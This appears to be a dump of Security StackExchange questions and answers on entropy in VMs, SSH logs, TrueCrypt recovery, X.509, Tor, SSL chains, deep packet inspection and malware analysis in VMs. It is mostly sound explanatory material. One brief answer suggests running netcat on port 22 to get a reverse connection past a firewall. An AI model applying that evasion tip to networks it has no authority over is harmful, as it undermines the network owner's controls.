  passed with only a single missed test out of the 426 tests executed.
  (Source: <a href=""http://jakob.engbloms.se/archives/1374"">Evaluating HAVEGE Randomness</a> on engbloms.se).</p>
</blockquote>

<ul>
<li>So, which virtualization platforms/hypervisors are safe to use with haveged in a virtual machine?</li>
<li>And is there a generally accepted best practice way to test whether a source of randomness is producing sufficienty high quality numbers?</li>
</ul>
","<p>(<strong>Caveat:</strong> I certainly don't claim that HAVEGE lives up to its claims. I have not checked their theory or implementation.)</p>

<p>To get randomness, HAVEGE and similar systems feed on ""physical events"", and in particular on the <em>timing</em> of physical events. Such events include occurrences of hardware interrupts (which, in turn, gathers data about key strokes, mouse movements, incoming ethernet packets, time for a hard disk to complete a write request...). HAVEGE also claims to feed on all the types of cache misses which occur in a CPU (L1 cache, L2 cache, TLB, branch prediction...); the behaviour of these elements depends on what the CPU has been doing in the previous few thousands clock cycles, so there is potential for some ""randomness"". This hinges on the possibility to measure current time with great precision (not necessarily accuracy), which is where the <a href=""http://en.wikipedia.org/wiki/Time_Stamp_Counter""><code>rdtsc</code></a> instruction comes into play. It returns the current contents of an internal counter which is incremented at each clock cycle, so it offers sub-nanosecond precision.</p>

<p>For a virtual machine system, there are three choices with regards to this instruction:</p>

<ol>
<li>Let the instruction go to the hardware directly.</li>
<li>Trap the instruction and emulate it.</li>
<li>Disable the instruction altogether.</li>
</ol>

<p>If the VM manager chooses the first solution, then <code>rdtsc</code> has all the needed precision, and should work as well as if it was on a physical machine, for the purpose of gathering entropy from hardware events. However, since this is a virtual machine, it is an application on the host system; it does not get the CPU all the time. From the point of view of the guest operating system using <code>rdtsc</code>, this looks as if its CPU was ""stolen"" occasionally: two successive <code>rdtsc</code> instructions, nominally separated by a single clock cycles, may report an increase of the counter by <em>several millions</em>. In short words, when <code>rdtsc</code> is simply applied on the hardware, then the guest OS can use it to detect the presence of an hypervisor.</p>

<p>The second solution is meant to make the emulation more ""perfect"" by maintaining a virtual per-VM cycle counter, which keeps track of the cycles really allocated to that VM. The upside is that <code>rdtsc</code>, from the point of view of the guest, will no longer exhibit the ""stolen cycles"" effect. The downside is that this emulation is performed through triggering and trapping a CPU exception, raising the cost of the <code>rdtsc</code> opcode from a few dozen clock cycles (it depends on the CPU brand; some execute <code>rdtsc</code> in less than 10 cycles, other use 60 or 70 cycles) to more than <em>one thousand</em> of cycles. If the guest tries to do a lot of <code>rdtsc</code> (as HAVEGE will be prone to do), then it will slow down to a crawl. Moreover, the exception handling code will disrupt the measure; instead of measuring the hardware event timing, the code will measure the execution time of the exception handler, which can conceivably lower the quality of the extracted randomness.</p>

<p>The third solution (disabling <code>rdtsc</code>) will simply prevent HAVEGE from returning good randomness. Since it internally uses a <a href=""http://en.wikipedia.org/wiki/Pseudorandom_number_generator"">PRNG</a>, the output may still fool statistical analysis tools, because there is a huge difference between ""looking random"" and ""being unpredictable"" (statistical analysis tools follow the ""look random"" path, but cryptographic security relies on unpredictability).</p>

<p>The <a href=""http://www.virtualbox.org/manual/ch09.html#idp20389984"">VirtualBox manual</a> claims that VirtualBox, by default, follows the first method (<code>rdtsc</code> is unconditionally allowed and applied on the hardware directly), but may be configured to apply the second solution (which you don't want, in this case).</p>

<p>To test what your VM does, you can try this small program (compile with <code>gcc -W -Wall -O</code> on Linux; the <code>-O</code> is important):</p>

<pre><code>#include &lt;stdio.h&gt;

#if defined(__i386__)

static __inline__ unsigned long long rdtsc(void)
{
        unsigned long long int x;

        __asm__ __volatile__ ("".byte 0x0f, 0x31"" : ""=A"" (x));
        return x;
}

#elif defined(__x86_64__)

static __inline__ unsigned long long rdtsc(void)
{
        unsigned hi, lo;

        __asm__ __volatile__ (""rdtsc"" : ""=a""(lo), ""=d""(hi));
        return ( (unsigned long long)lo)|( ((unsigned long long)hi)&lt;&lt;32 );
}

#endif

int
main(void)
{
        long i;
        unsigned long long d;

        d = 0;
        for (i = 0; i &lt; 1000000; i ++) {
                unsigned long long b, e;

                b = rdtsc();
                e = rdtsc();
                d += e - b;
        }
        printf(""average : %.3f\n"", (double)d / 1000000.0);
        return 0;
}
</code></pre>

<p>On a non-virtual machine, with the ""true"" <code>rdtsc</code>, this shall report a value between 10 and 100, depending on the CPU brand. If the reported value is 0, or if the program crashes, then <code>rdtsc</code> is disabled. If the value is in the thousands, then <code>rdtsc</code> is emulated, which means that the entropy gathering may not work as well as expected.</p>

<p>Note that even getting a value between 10 and 100 is not a guarantee that <code>rdtsc</code> is not emulated, because the VM manager, while maintaining its virtual counter, may subtract from it the expected time needed for execution of the exception handler. Ultimately, you really need to have a good look at the manual and configuration of your VM manager.</p>

<hr />

<p>Of course, the whole premise of HAVEGE is questionable. For any practical security, you need a few ""real random"" bits, no more than 200, which you use as seed in a <a href=""http://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator"">cryptographically secure PRNG</a>. The PRNG will produce gigabytes of pseudo-alea indistinguishable from true randomness, and that's good enough for all practical purposes.</p>

<p>Insisting on going back to the hardware for every bit looks like yet another outbreak of that flawed idea which sees entropy as a kind of gasoline, which you burn up when you look at it.</p>
","34552"
"SSH Bad Protocol Version Identification String- What is it?","21489","","<p>I need some help identifying some Bad Protocol version identification errors from our server. </p>

<p>We're getting the following:</p>

<pre><code>sshd[xxxx]: Bad protocol version identification '\200\342\001\003\001' from xx.xx.xx.xxxx
</code></pre>

<p>I don't know the format that <code>'\200\342\001\003\001'</code> is in, so it will be great if someone could help!</p>
","<p>This is octal representation (base 8). During the initial steps of a SSH connection, the client and the server send each other the version(s) of the protocol they implement, as strings. These strings must follow a specific format.</p>

<p>Here, your server received from the client a ""protocol version"" string consisting of five bytes, of value 128, 226, 1, 3 and 1, in that order. This is not a ""protocol version string"" which makes sense. Probably, the client was not trying to do some SSH at all, but instead some other protocol.</p>

<p>A lot of virus try to propagate automatically that way: by trying known vulnerabilities of some protocols on random IP addresses and ports. So any publicly reachable server (like your SSH server) will get that kind of noise. Best thing to do is to ignore it altogether.</p>
","29511"
"Is there a legitimate reason I should be required to use my company's computer? (BYOD prohibited)","21473","","<p>I just got a new job at a medium-sized (~100 employees) company and one of the first things I was told is that I cannot use my own computer, because I need to be able to connect to their network, access files, etc. I didn't think that made much sense because to my knowledge, as long as I'm on their network, I should be able to access anything I need to.</p>

<p>So I asked my friend this question, who told me it might be a security thing. Could there be a security-related reason as to why I'm required to use my employer's machine?</p>
","<p>So this is an interesting question with a few points into why you not only should WANT to do this, but should do this for your own safety and security. It helps first if you understand that companies point of view before we talk about how it can benefit you.</p>

<h3>Why would a company want to do this?</h3>

<p>Many reasons. It makes it assured that your computer can access the network, do what it needs to do, and function how they need it to at a baseline. This way the IT department can maintain it easily, quickly, and up to standard.</p>

<h3>Can they make me do this?</h3>

<p>YES THEY CAN! They are having you work on their property, with their property, to make sure it works properly. This way you can actually do your job.</p>

<h3>Should I do this?</h3>

<p>Oh god yes.</p>

<ul>
<li>This lets you pass the buck if needed. Now if something that is supposed to work, doesn't work, it isn't your fault.</li>
<li>Maintenance becomes a breeze because if your files are backed up to a safe place (any installers you used as well), then if something really bad happens they can restore it to a disk image and have your computer back to you in the matter of a few hours instead of days.</li>
<li>IF you leave the company for any reason, you don't have to relinquish your personal computer to them for driver scrubbing or making sure you don't take any company software or intellectual property with you.</li>
<li>IT has no claim to touch your personal computer for any reason.</li>
<li>For security reasons, you can make sure that your work computer is up to their standards and any potential breach won't be your fault, but their bad policies' fault.</li>
</ul>

<p><strong>And here's the whammy: It keeps you safe from the company!</strong></p>

<p><em>In using the company computer your own personal information won't be on the company network, and you can keep your private life away from your work life. This is a big advantage because you can make sure that your own data, is your own data.</em></p>
","102543"
"How is Chase Mobile Deposit Secure?","21450","","<p>Chase has <a href=""https://www.chase.com/mobile-banking/check-deposit"" rel=""nofollow"">this app</a> that allows you to snap a picture of a check with your phone and deposit that check into your account.</p>

<p>How do they prevent:</p>

<ol>
<li>Someone from depositing a check that's not written to them? (I can’t imagine this app is smart enough read the scribble “to” Filed) Are they leaving it up the check writer (who may not even be a Chase customer) to catch this and complain?</li>
<li>What's to stop someone from depositing the check to Chase by Phone,then 2 mins later walk into another non-Chase bank and deposit it there?</li>
<li>What's to stop someone from depositing the same 12 every other month?</li>
</ol>

<p>The only thing I can think of I that they are simply hoping that these thing will happen in such small quantities that they can handle it on a case by case basis <strong>IF</strong> the check writer complains...</p>

<p>You can literally walk into you AR Dept when the clerk is out to lunch and snap a picture of a 100k check! Sure, it's stupid to be so bold with such a large check but what about small ones? In my mind there there is a good chance check will not be rejected when the clerk deposits it in the company's bank that afternoon.</p>
","<p>This is precisely as secure as depositing a check at the ATM.</p>

<p>You could go up to an ATM, pop in your debit card and say you're depositing $3500, put a blank piece of paper in a deposit slip and deposit it.</p>

<p>Same rules apply with the tech you describe as an ATM: Try to fool it, and when time comes around to actually push the routing numbers and bank account on the check through for a debit on the other end, the debit fails and upon inspection they realize it's not a bounced check and it's your fault. The money is debitted back out of your account and you get penalized for being a wanker, they may even close your account for such behaviour altogether as it's against their TOS.</p>
","26425"
"Repairing corrupt TrueCrypt volumes/disks?","21440","","<p>(I'm asking this for a friend of mine as I'm trying to help him with this problem over remote desktop, so if any details are needed, just ask and I will get them). Two entire hard disks were encrypted with TrueCrypt, and then decrypted with a recovery CD created on a different computer, but with the same password. Windows then detected the disks as ""RAW"", instead of the filesystem it was supposed to be (FAT or NTFS, not sure). fdisk on an Ubuntu virtual machine shows one FAT16 partition spanning one entire drive. Various partition recovery programs such as TestDisk were run on the drives with no success. I think the file data itself is still there, but the partition or filetables are corrupt or missing. We've tried altering the partition tables on the drives with no success. Any help would be very, very greatly appreciated.</p>

<p>Currently, we are running TestDisk on one mounted virtual drive in Windows. The other hard disk will not mount, but this one does. The hard disk seems to still be encrypted, and TestDisk found a few NTFS partitions, and is still scanning currently. I'll update this as the situation changes.</p>
","<p><strong>First a bit of background;</strong> Truecrypt uses a classic 2-stage approach:</p>

<ul>
<li>There is a small volume header, which the end user can decrypt with his password.</li>
<li><a href=""http://www.truecrypt.org/docs/?s=encryption-scheme"">Inside this header there is a master encryption key</a>, which is the one Truecrypt uses to encrypt and decrypt the main user data volume.</li>
</ul>

<p>So your task right now is to recover or re-create the <em>original</em> volume header, with the <em>original</em> master encryption key used to create the volume.</p>

<p><strong>I hope your recovery CD is a <a href=""http://www.truecrypt.org/docs/?s=rescue-disk""><em>Truecrypt</em> Rescue Disk</strong>, as described here</a>. If it's a recovery CD from Microsoft Windows or partition tool (like Norton Ghost), then you are probably out of luck. These will very likely not contain a copy of the original Truecrypt volume header, or contain a damaged header, and thus be of no use.</p>

<p><strong>If your recovery CD is made <em>on another computer, for another Truecrypt volume</em>, then it is of no use.</strong> It contains a copy of a volume header with a master encryption key -- but the master encryption key is for the <em>other</em> computer's volume, not for your <em>friend's volume</em>.</p>

<p><strong>Assuming that you're not stuck due to the above problems,</strong> then here is what I would do to recover data:</p>

<ol>
<li>Make a bit-by-bit copy of the harddisks to empty harddisks of the same or larger size. You could do this using fx Norton Ghost, Acronis Trueimage, or Linux tools like G4L or Clonezilla Live. Then put the original disks away. (The purpose of this step is to keep the original disks safe, in case I accidentally make an irreversible mistake while working with the volumes.)</li>
<li>Put the volume copies into a known good computer.</li>
<li>And now it should (hopefully) be a case of booting from the Truecrypt Rescue Disk (CD), and <a href=""http://www.truecrypt.org/docs/?s=rescue-disk"">follow Truecrypt's instructions</a>.</li>
</ol>
","17206"
"How X509 Certificates are used for Encryption","21379","","<p>I have small doubt regarding the process of X509.
I am aware of OpenPGP Encryption/Decryption, where we generate the public key and private key. We can share the public key to vendors and they can encrypt data with the key and we can decrypt the data using out private key. It's simple and straight-forward for me.</p>

<p>When it comes to X509, I am bit confused. My client wants to use X509 certificate to transfer sensitive information [which's already encrypted using symmetric Encryption like AES] between two people [between client and his vendors]. How X509 works if we can generate the certificate using only public key. </p>

<p>Assume, if I encrypt the data using AES with one random generated key. How do I transfer this data along with key to vendor using X509 so that any third party will not intercept during network transmission.</p>

<p>Could any one please explain? Btw, we transfer the data in SOAP message including Certificate info</p>
","<p><a href=""http://en.wikipedia.org/wiki/X.509"">X.509</a> is a format for <em>certificates</em>: a certificate is a sequence of bytes which contains, in a specific format, a <em>name</em> and a <em>public key</em>, over which a <a href=""http://en.wikipedia.org/wiki/Digital_signature"">digital signature</a> is computed and embedded in the certificate. The signer is a <a href=""http://en.wikipedia.org/wiki/Certificate_authority"">Certification Authority</a> which <em>asserts</em> that the public key is indeed owned by the entity known under that name. By verifying the signature, you can make sure that the certificate is genuine, i.e. is really what the CA issued; and, that way, you gain trust in the binding of name with public key (insofar as you trust the CA for being honest and not too gullible, and as you know the CA key for signature verification, which may entail obtaining a certificate for the CA, and verifying that certificate, and so on, up to a <em>trust anchor</em> aka <em>root certificate</em>).</p>

<p>Thus, X.509 is a way to <em>distribute public keys</em>, by which I mean: a method which allows various actors (e.g. you) to know, with some guarantee of non alteration by malicious third parties (i.e. ""attackers"") the public keys of other actors.</p>

<p><a href=""http://www.openpgp.org/"">OpenPGP</a> is a standard format for a lot of things. <em>One</em> of the things which OpenPGP defines is a way to encode a public key along with a ""name"" (an email address), and a signature over these two. That's, really, a certificate in its own right (although with a format which is not compatible with X.509). But OpenPGP also defines how to <em>use</em> the public key of a given individual (let's call him Butch) in order to encrypt a bunch of bytes that only Butch, using his <em>private</em> key, will be able to decrypt. Technically, this uses a randomly generated session key, used with AES (or similar) to encrypt the raw data, and that session key is what is encrypted with the recipient's public key (generally of type RSA or ElGamal).</p>

<p>Therefore, for your problem, you do not want to ""encrypt with X.509"". X.509 defines nothing about encryption. <strong>What you want</strong> is to use a standard format which describes encryption <em>with the recipient's public key</em> and builds on X.509 certificates for the public key distribution. This standard format, coupled with X.509, would be an analogous to OpenPGP. This standard format exists and is called <a href=""http://tools.ietf.org/html/rfc5652"">CMS</a> (formerly known as ""PKCS#7""). When CMS objects are sent by email, this becomes another layer of standard, which is called <a href=""http://en.wikipedia.org/wiki/S/MIME"">S/MIME</a>.</p>

<p>CMS (or S/MIME) is what you need for asynchronous communication: you prepare a blob, to be sent later on to the recipient, like what you do with OpenPGP. If you can make a <em>synchronous</em> communication (sender and recipient are ""online"" simultaneously), then you can use <a href=""http://tools.ietf.org/html/rfc5246"">SSL/TLS</a> (or its Web counterpart <a href=""http://en.wikipedia.org/wiki/HTTP_Secure"">HTTPS</a>). In SSL, the <em>server</em> has a public key, which it sends to the client as an X.509 certificate. The client validates the certificate, then uses the public key contained therein in order to establish a session key with the server, and encrypt the data with that session key.</p>

<p>In any case, assembly of cryptographic algorithms into <em>protocols</em> is known to be hard to do correctly, nigh impossible to test for security, and fraught with perils. So don't imagine that you may build your own mix; you really should rely on an existing standard, like CMS or SSL.</p>
","31142"
"How to create ssh tunnel using netcat?","21370","","<p>I want to create reverse connection between two machines, but these is a firewall in the middle preventing all connections, except ssh. I want to create ssh tunnel using netcat, could you please tell me how to it?</p>
","<p>You don't need to create an SSH tunnel to do this - all you need to do is get NetCat to talk on port 22, as that is all the firewall is likely to be blocking on.</p>

<p><a href=""http://linux.die.net/man/1/nc"" rel=""nofollow"">man nc</a> should give you all the information you need.</p>
","20533"
"Is it safe to use virtual machines when examining malware?","21366","","<p>We want to study for the CEH program and have downloaded 12 DVDs that 6 DVDs are software key-loggers, Trojans, etc. that are all detected by antivirus. This prevents us from examining them and learning how they work.</p>

<p>I have instructed students not to uninstall antivirus as running these malicious files is not safe on its own. It might even spread on the network.</p>

<p>One of the students suggests to use <a href=""http://windows.microsoft.com/is-IS/windows7/products/features/windows-xp-mode"" rel=""nofollow noreferrer"">Windows XP mode</a>. Is this safe? I see these articles <a href=""https://security.stackexchange.com/questions/12546/is-it-safe-to-install-malware-in-a-vm"">1</a> and <a href=""https://security.stackexchange.com/questions/9011/does-a-virtual-machine-stop-malware-from-doing-harm"">2</a> here but the answers are contradictory and confuse us.</p>

<p>Are virtual machines safe for downloading and installing Trojans, key-loggers, etc.?</p>

<p>Is there another way to solve this problems, e.g. set up a lab, to show what happens to victims of the malware?</p>
","<p>Are virtual machines safe for this?  The answer is the same as for a lot of questions of the form ""Is X safe?"": no, it's not absolutely safe.</p>

<p>As described elsewhere, bugs in the virtual machine or poor configuration can sometimes enable the malware to escape.  So, at least in principle, sophisticated malware might potentially be able to detect that it's running in a VM and (if your VM has a vulnerability or a poor configuration) exploit the vulnerability or misconfiguration to escape from your VM.</p>

<p>Nonetheless, it's pretty good.  Probably <em>most</em> malware that you run across in the field won't have special code to escape from a VM.</p>

<p>And running the malware in a VM is certainly a lot safer than installing it directly onto your everyday work machine!</p>

<p>Probably the biggest issue with analyzing malware samples in a VM is that some malware authors are starting to get smart and are writing their malware so that it can detect when it is run in a VM and shut down when running inside a VM.  That means that you won't be able to analyze the malicious behavior, because it won't behave malicious when it's run inside a VM. </p>

<p>What alternatives are there?  You could set up a sacrificial machine on a local machine, install the malware on there, then wipe it clean.  Such a test network must be set up <em>extremely carefully</em>, to ensure that the malware can't propagate, can't spread to other machines of yours, and can't do any harm to others.</p>

<p>References:</p>

<ul>
<li><p><a href=""https://security.stackexchange.com/q/12546/971"">Is it safe to install malware in a VM</a>  (Summary: ""There is no simple answer"", and there are some risks)</p></li>
<li><p><a href=""https://security.stackexchange.com/q/3056/971"">How secure are virtual machines really? False sense of security?</a>  (Summary: there are definitely some risks that could allow malware to escape the VM)</p></li>
<li><p><a href=""https://security.stackexchange.com/q/9011/971"">Does a Virtual Machine stop malware from doing harm?</a>  (Summary: there have occasionally been vulnerabilities that has enabled malware to escape the VM)</p></li>
</ul>
","23503"
"How much can I trust Tor?","21299","","<p>How much can I depend on <a href=""http://www.torproject.org/"">Tor</a> for anonymity? Is it completely secure? My usage is limited to accessing Twitter and Wordpress.</p>

<p>I am a political activist from India and I do not enjoy the freedom of press like the Western countries do. In the event my identity is compromised, the outcome can be fatal.</p>
","<p>Tor is better for you than it is for people in countries whose intelligence services run lots of Tor <a href=""https://en.wikipedia.org/wiki/Tor_(anonymity_network)#Exit_node_eavesdropping"" rel=""nofollow noreferrer"">exit nodes</a> and sniff the traffic.  However, all you should assume when using Tor is that, if someone's not doing heavy statistical traffic analysis, they can't directly correlate your IP with the IP requesting resources at the server.</p>

<p>That leaves many, many methods of compromising your identity still open.  For instance, if you check your normal email while using Tor, the bad guys can know that that address is correlated with other Tor activity.  If, as @Geek said, your computer is infected with malware, that malware can broadcast your identity outside the Tor tunnel.  If you even hit a webpage with an XSS or CSRF flaw, any other web services you're logged into could have their credentials stolen.</p>

<p>Bottom line, Tor is better than nothing; but if your life is on the line, use a well-secured computer for accessing Twitter and WordPress using it, and don't use that computer for anything else.</p>
","1060"
"Proxy vs. Firewall","21298","","<p>I understand that very simply put a proxy is a sort of 'man in the middle' allowing/denying access to certain services/resources. Strictly in terms of security (I mean here privacy, parental control and the like excluded), can it offer any added security compared to a firewall?</p>
","<p>Yes, a proxy can provide extra security.</p>

<p>Proof by example:</p>

<ul>
<li>A web proxy could implement malware scanning. It could prevent you from visiting blacklisted sites (i.e. known to be malicious to browsers).</li>
<li>You're on an untrusted network but need http access without being subjected to MITM attacks. Make the http connection through an authenticated, encrypted connection to your trusted web proxy.</li>
</ul>
","9483"
"SSL certificate chain verification","21272","","<p>After reading many articles and watching many tutorials I decided to be specific because there are some things about <strong>SSL certificate chain verification</strong> and <strong>SSL cetificate verification in general</strong> that I couldn't verify against all the tutorials I have read nor the ones I watched.</p>

<p><strong>CASE 1:</strong></p>

<p>Let me take a case where I own a certificate from <strong>Verisign</strong>, after the verification process they gave me a public/private key pair.</p>

<p>My server sends the public key(my certificate) to the browser, the browser own a copy of <strong>Verisign</strong> public key.</p>

<p>The following questions may seem stupid, but there isn't consistency among tutorials and everytime I try to understand I got myself into another corner.</p>

<ul>
<li>How will the browser with <strong>Verisign</strong> public key is going to identify that <strong>my public key</strong> is indeed a valid <strong>Verisign</strong> key that can be used for encrypting messages that my <strong>Verisign</strong> private key can decrypt?, I assume its the <strong>Verisign</strong> public key <strong>digital signature</strong> that is tested against the server <strong>public key digital signature</strong>?, <strong>I may be wrong</strong>, but even if I am right I will be glad for a bit of clarification.</li>
<li>In case its indeed the <strong>digital signature</strong> that is tested I assume there is a relationship between all of <strong>Verisign</strong> public keys?, or maybe there is only relationship between each <strong>public key Verisign</strong> assign to a specific client(website/device/etc) and the public key the browser/operating system including.</li>
</ul>

<p><strong>CASE 2:</strong></p>

<p>Intermediate certificates.</p>

<ul>
<li>I understand that the need for them is <a href=""https://support.globalsign.com/customer/portal/articles/1217450-overview---intermediate-root-certificates"">security</a>, so the root CA private key can stay offline, if there are more reasons i'll love to hear about them.</li>
<li>About the chain verification, I assume the server public key <strong>digital signature</strong> is tested against the server <strong>intermediate certificate digital signature</strong>, if its valid now it is the turn for the <strong>intermediate certificate digital signature</strong> to be tested against the <strong>browser/operating system pre-installed public key digital signature</strong>, and if this is also valid, the client has successfully validate both the intermediate certificate and the public key of the server.</li>
</ul>

<p><strong>I know i probably missed all up, if anyone can help me straight things up I will be very thankful.</strong></p>
","<p>It's not at all clear to me what you don't understand, so I'll take it very slowly. </p>

<p><strong>First some terminology.</strong> It's important to get this straight, because otherwise you can't know correctly what you're hearing and saying.</p>

<p><strong>Key pair:</strong> a <strong>private key</strong> and a corresponding <strong>public key</strong> which are mathematically related and used for <strong>public-key cryptography</strong> (PKC) also called <strong>asymmetric cryptography</strong>. For RSA, which is usually the only PKC someone knows when they don't specify, the public key consists of a modulus N which is the product of two large primes, and a public exponent E which can be and usually is small (in fact it usually is either 3 or 65537); the private key contains at least N and a private exponent D such that E x D = 1 mod phi(N); in practical use, the private key often contains additional values that enable faster computation, but there are quite a few other questions about that so I won't repeat them.</p>

<p><strong>Digital signature:</strong> a value computed, for a specified chunk of data (almost always a hash of the ""real"" data) using a private key, such that the corresponding public key can be used to determine if the given signature is correct for the given data and could only have been generated by the given private key. This allows the verifier to determine that the data has not been altered or forged, and the data was sent or at least seen by the holder of the private key, but it doesn't say anything about who that holder is.</p>

<p><strong>(X.509 aka PKIX) (Identity) Certificate:</strong> a data structure including a public key for an <strong>entity</strong> and the identity of that entity; plus some other information related to the entity and/or the CA; all signed by a (generally) different entity called a <strong>Certificate Authority</strong> or <strong>CA</strong>.  I hope you meant Verisign only as an example; it is one CA but not the only one; you can get an equally good Internet certificate from others like GoDaddy, Comodo, <strike>StartCom</strike> LetsEncrypt, etc. If you trust a given CA to issue certs correctly, then you can trust the much larger number of public keys and identities in certs it issues. <em>Update 2017:</em> StartCom is no longer good, since it was bought by WoSign who was then caught breaking CABforum rules and <a href=""https://security.stackexchange.com/a/18945/39571"">now is widely distrusted</a>. OTOH LetsEncrypt is now widely-trusted, and free. Which further emphasizes the importance of having multiple CAs!</p>

<p><strong>User (end-entity) certificate:</strong> a certificate containing the key and identity for  anything other than a CA, such as an SSL server, an SSL client, a mail system, etc.</p>

<p><strong>(CA) Root certificate:</strong> a certificate containing the public key of a root CA. Since there is no CA ""above"" the root, a dummy signature using the CA's own private key is used, but that has no security value. You must decide (or delegate) whether to trust that key
""out of band"", that is, based on reasons other than cryptographic computations.</p>

<p><strong>Chain or intermediate certificate (and CA):</strong> (as your question indicates) most CAs now operate in a hierarchical fashion, where the root key is not used to directly issue user certificates. Instead the root CA and its root (private) key is used to sign certificates for several intermediate or subordinate CAs, each of which has their own keypair. Each intermediate CA can then issue user certs, or sometimes a second level of intermediate certs; this can be extended to several levels, but that's very rarely needed.</p>

<p>Since you mention a browser, you are apparently concerned (only?) with certificates (and keys) for HTTPS (HTTP over SSL/TLS). This is a common and important use of certificates and PKC, but not the only use.</p>

<p><strong>Now, case 1.</strong> Since this case doesn't consider chain/intermediate, and Verisign does use that, I'll use a hypothetical <strong>SimpleCA</strong> instead. First, <strong>no</strong> CA ever has or sends you your private key. <strong>You</strong> generate your key pair and send your public key <strong>to</strong> the CA in a data structure called a <strong>Certificate Signing Request</strong> or <strong>CSR</strong>. The CSR also should contain your name; for an SSL server this is normally the domain name (FQDN) of the server. The CSR contains some other data you can ignore for now. The CA verifies your claimed identity (for SSL server, that you ""control"" the specified domain name), and usually collects a fee, and then creates a certificate which contains:</p>

<ul>
<li>your name (here SSL server FQDN) as the <strong>Subject</strong> and/or one or several name(s) as <strong>SubjectAlternativeNames</strong> especially in recent years</li>
<li>your public key as <strong>SubjectPublicKey</strong>, and usually a hash of it as <strong>SubjectKeyID</strong> </li>
<li>a <strong>ValidityPeriod</strong> specifying how long the certificate is valid, chosen by the CA based partly on how much you pay them</li>
<li>the <strong>CA</strong>'s name as the <strong>Issuer</strong>, and usually an <strong>AuthorityKeyID</strong> which also identifies the CA</li>
<li>some other data you can ignore for now</li>
</ul>

<p>and this whole structure is signed using the CA's private key (which means it can be verified using the CA's public key). The CA sends this certificate back to you to use in your server along with the private key you already have.</p>

<p>Previously, assuming <strong>SimpleCA</strong> showed it can be trusted to appropriately verify applicants and paid a fee, the browser vendors (Microsoft, Mozilla, Google, Apple, etc.) agreed to include its public key with their browsers, normally in the form of SimpleCA's root cert. Now when some browser connects to your server and you send your cert which says in effect ""Aviel-server approved by SimpleCA"", the browser finds SimpleCA's root cert and thus <strong>SimpleCA's public key</strong> and uses that to <strong>verify</strong> that <strong>your cert</strong> is signed correctly, <strong>and</strong> that the server name in your cert matches the server in the URL the user wants; if both those pass, it accepts the <strong>public key in your cert</strong> as the correct public key for you, and uses it to complete the SSL/TLS handshake. If not it displays some kind of warning or error.</p>

<p><strong>Unless</strong>, that is, your cert was <strong>revoked</strong>. If your private key is compromised, or if the CA determines that you no longer control the claimed identity (including if they discover you never did but deceived them on the application), the CA publishes that your cert is revoked and therefore browsers don't trust it even though the signature still verifies (because the RSA computation is a fixed mathematical process independent of time or environment).
But revocation, and if and when and how well it works, is a whole complicated topic by itself, and this answer is large enough already.
(edit) <a href=""https://security.stackexchange.com/questions/29686/how-does-ocsp-stapling-work"">How does OCSP stapling work?</a> covers revocation (actually both OCSP and CRLs) with ursine thoroughness. If your certificate is <strong>expired</strong> (past the end of its validity period) it is also invalid; this one is easy for browser to check. Formally a certificate can also be invalid before the beginning of its validity period, but in practice CAs don't issue 'post-dated' certs unless someone messes up the timezone or something.</p>

<p>However, the set of CA root certificates supplied in a browser is usually only the default; the browser user can decide to add new roots or delete existing ones if they choose. And if so that may make your server trusted when it wasn't before, or untrusted when it was before.</p>

<p><strong>Case 2 (chain).</strong> One reason for intermediate CAs and thus intermediate or chain certs is keeping the root key offline as you say. Another reason is to allow the intermediate CAs to be managed much like users: they can have limited validity periods and be renewed, and if compromised (or just no longer wanted) they can be revoked, and this happens automatically and nearly invisibly. On the other hand if you have to extend, replace, or revoke a root, basically every browser in the world must be updated. That's a lot of work, and is never done completely because users will refuse or forget to install an update and be left trusting a CA that isn't secure and thus probably servers that aren't legitimate.
Also for revocations that are published the older way using a Certificate Revocation List (CRL) dividing the issued certs over multiple intermediate CAs makes CRL management easier.</p>

<p>With a single intermediate/chain cert, the process is changed as follows. Let's say <strong>VerisignServerB</strong> is issued under <strong>VerisignRoot</strong> and is used in turn to issue <strong>Aviel-server</strong>. (The actual names are longer, but this is easier to see.) Then your server is configured to send both Aviel-server and VerisignServerB to the browser. The browser checks that the VerisignServerB <strong>cert</strong> is signed correctly under the VerisignRoot <strong>public key</strong> (as before, normally stored as a selfsigned root cert), AND that Aviel-server <strong>cert</strong> is signed correctly under VerisignServerB <strong>public key</strong> from that cert, and that Aviel-server <strong>cert name</strong> matches the desired one. It doesn't matter which order the signatures are checked as long as both are.</p>

<p><a href=""https://security.stackexchange.com/questions/56389/ssl-certificate-framework-101-how-does-the-browser-actually-verify-the-validity"">SSL Certificate framework 101: How does the browser actually verify the validity of a given server certificate?</a> 
has a nice graphical example of this which may help you.</p>

<p>For multiple intermediate/chain certs, when used, the extension should now be obvious.</p>
","59596"
"My ISP uses deep packet inspection; what can they observe?","21219","","<p>I found out that my ISP does <a href=""https://en.wikipedia.org/wiki/Deep_packet_inspection"" rel=""noreferrer"">deep packet inspection</a>.
Can they see the contents of HTTPS connections?  Wouldn't having HTTPS ensure that they can't see the contents being transferred?</p>

<p>And can having a VPN protect me against deep 
packet inspection by ISPs?</p>
","<p><strong>Deep Packet Inspection, also known as complete packet inspection, simply means they are analyzing all of your traffic</strong> as opposed to just grabbing connection information such as what IP's you are connecting to, what port number, what protocol and possibly a few other details about the network connection. </p>

<p>This is normally discussed in contrast to the gathering of NetFlow information which mainly collects the information listed above.</p>

<p>Deep packet inspection gives your provider a lot of information about your connections and habits of Internet usage. In some cases, the full content of things like SMTP e-mails will be captured.</p>

<p>HTTPS does encrypt the connections but your browser has to make DNS requests which are sent primarily via UDP so that data will be collected as will any unencrypted links or unencrypted cookies sent incorrectly without https. These additional bits which will be collected may be very telling about what type of content you are looking at.</p>

<p><strong>The larger concern for most people is about data aggregation</strong>, by collecting this information a data scientist could create a fingerprint for your Internet usage and later associate with past activities or activities from other locations (when you are at work or are on vacation). Likewise, your service provider may choose to sell this to any number of organizations (possibly including criminal organizations) where it could then be used against you in ways. <strong>In many countries, people have an expectation that their communications are considered to be private and collecting this data very much goes against that privacy expectation.</strong> </p>

<p>Another interesting aspect of this is <strong>in the cases like the US where this data may soon be sold it allows International communications sent to people, or servers, in the US be sold as well</strong>. Likewise, this could potentially allow every agency from local law-enforcement, military, tax authorities, immigration authorities, politicians, etc. a way to bypass long-standing laws which have prevented them from accessing this type of information, or important informational subsets within this data otherwise. </p>

